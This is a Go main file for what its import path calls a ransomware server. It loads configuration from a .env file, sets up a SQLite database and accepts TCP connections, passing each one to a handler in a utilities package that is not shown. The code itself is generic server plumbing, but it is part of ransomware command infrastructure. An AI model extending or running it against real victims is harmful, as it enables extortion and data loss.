package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"ransomware_server/utilities"

	"github.com/joho/godotenv"
)

func main() {

	// Load .env file
	err := godotenv.Load()
	if err != nil {
		log.Panicf("Error loading .env file: %v", err.Error())
	}

	// Setup server startup information
	protocol := os.Getenv("PROTOCOL")
	listeningAddress := os.Getenv("LISTEN_ADDRESS")
	listeningPort := os.Getenv("LISTEN_PORT")
	listeningURL := listeningAddress + ":" + listeningPort
	fmt.Printf("Listening on %s\n", listeningURL)

	// Setting up the database
	// Database connection should be consistently opened for the server to work properly.
	// Only close the database connection when the server is shutting down.
	db, err := utilities.SetupDatabase()
	if err != nil {
		log.Panicf("Error setting up the database: %v", err.Error())
	}
	fmt.Printf("Database connection established and SQLite3 DB file will be located at %s\n", os.Getenv("SQLITE3_FILEPATH"))

	// Listening
	listener, err := net.Listen(protocol, listeningURL)
	if err != nil {
		log.Panicf("Error listening: %v", err.Error())
	}
	defer listener.Close()

	// Detect ctrl+c and close the database connection
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt)
	go func() {
		for signal := range c {
			if signal == os.Interrupt {
				fmt.Println("Ctrl+C detected. Closing database connection and exit.")
				db.Close()
				os.Exit(0)
			}
		}
	}()

	// Making a loop to accept incoming connections
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Panicf("Error accepting: %v", err.Error())
		}

		// Handle the connection
		go utilities.HandleClientConnection(db, conn)
	}
}
